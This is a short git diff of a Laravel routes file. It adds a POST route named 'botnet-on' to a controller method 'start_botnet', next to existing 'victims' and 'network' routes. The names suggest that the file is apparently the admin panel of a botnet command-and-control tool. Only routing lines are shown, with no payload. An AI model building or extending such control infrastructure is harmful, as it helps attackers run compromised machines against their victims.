@@ -36,4 +36,8 @@ Route::middleware(['auth'])->group(function () {
     Route::post('network/{id}', [\App\Http\Controllers\NetworkController::class, 'destroy'])->name('network.destroy');
     Route::get('victims', [\App\Http\Controllers\VictimsController::class, 'index']);
     Route::put('victims/{id}', [\App\Http\Controllers\VictimsController::class, 'update'])->name('victims.update');
+
+
+    Route::post('botnet-on', [\App\Http\Controllers\HomeController::class, 'start_botnet']);
+
 });
